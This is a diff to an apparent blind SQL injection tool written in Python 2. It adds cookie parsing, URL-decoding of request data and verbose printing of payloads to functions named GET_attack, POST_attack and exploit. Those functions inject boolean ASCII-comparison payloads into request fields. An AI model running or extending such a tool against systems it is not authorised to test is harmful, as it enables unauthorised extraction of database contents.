@@ -3,6 +3,7 @@
 __author__ = 'Deen <1123537671@qq.com>'
 
 import sys, requests, re, argparse
+from urllib import unquote
 from binascii import b2a_hex as hex
 
 DATAS = ''
@@ -163,7 +164,9 @@ def cut_payload(data, start_num, nums):
 
 
 def last_payload(payload, ascii_num):
+
     payload = "((%s)=%s)" % (payload, str(ascii_num))
+
     return payload
 
 
@@ -176,9 +179,15 @@ def cookie_handle(cookies):
     try:
         keys = []
         values = []
-        c1 = cookies.split(';')
-        for i in c1:
-            c2 = i.split('=')
+        if ';' in cookies:
+            c1 = cookies.split(';')
+            for i in c1:
+                c2 = i.split('=')
+                keys.append(c2[0])
+                values.append(c2[1])
+        else:
+            c1 = cookies
+            c2 = c1.split('=')
             keys.append(c2[0])
             values.append(c2[1])
         cookie = dict(zip(keys, values))
@@ -214,6 +223,7 @@ def data_handler(data, payload):
             c2 = i.split('=')
             keys.append(c2[0])
             try:
+                c2[1] = unquote(c2[1])
                 values.append(c2[1].replace('*', payload))
             except:
                 pass
@@ -221,7 +231,7 @@ def data_handler(data, payload):
         return datas
     except:
         print color_print('r', " [ Error ] ") + color_print('lgray', "Data handle error,check the data ")
-        print color_print('r', " [ Error ] ") + color_print('b', "The cookies input: ") + color_print('lgray', data)
+        print color_print('r', " [ Error ] ") + color_print('b', "The data input: ") + color_print('lgray', data)
         sys.exit(0)
 
 
@@ -230,8 +240,11 @@ def GET_attack(full_url, cookie, proxy, headers=None):
         "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
         "Content-Type": "application/x-www-form-urlencoded"
     }
-
-    cookies = cookie_handle(cookie)
+    if len(cookie)>0:
+        cookies = cookie_handle(cookie)
+    else:
+        cookies = {}
+        pass
 
     proxies = {"http": proxy, "https": proxy.replace('http', 'https'), }
 
@@ -263,8 +276,11 @@ def POST_attack(full_url, cookie, proxy, data, headers=None):
         "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
         "Content-Type": "application/x-www-form-urlencoded"
     }
-
-    cookies = cookie_handle(cookie)
+    if len(cookie)>0:
+        cookies = cookie_handle(cookie)
+    else:
+        cookies = {}
+        pass
 
     proxies = {"http": proxy, "https": proxy.replace('http', 'https'), }
 
@@ -283,8 +299,8 @@ def POST_attack(full_url, cookie, proxy, data, headers=None):
 
     except:
         print color_print('r', " [ Error ] ") + color_print('lgray',
-                                                            "Request POST error, check the proxies, url and the cookie ")
-        print color_print('r', " [ Error ] ") + color_print('b', "data: ") + color_print('lgray', data)
+                                                            "Request POST error, check the proxies, data url and the cookie ")
+        #print color_print('r', " [ Error ] ") + color_print('b', "data: ") + color_print('lgray', data)
         print color_print('r', " [ Error ] ") + color_print('b', "proxies: ") + color_print('lgray', proxy)
         print color_print('r', " [ Error ] ") + color_print('b', "url: ") + color_print('lgray', full_url)
         print color_print('r', " [ Error ] ") + color_print('b', "cookie: ") + color_print('lgray', cookie)
@@ -355,6 +371,11 @@ def exploit(target_url, prefix, suffix, table, column, tables, columns, keywords
 
                 if data:
                     #data = data.replace('*', prefix + l_payload + suffix )
+                    if v:
+                        info = color_print('g', " [ Payload ] ") + color_print('lgray', l_payload)
+                        print info
+                    else:
+                        pass
                     datas = data_handler(data, prefix + l_payload + suffix)
 
                     '''
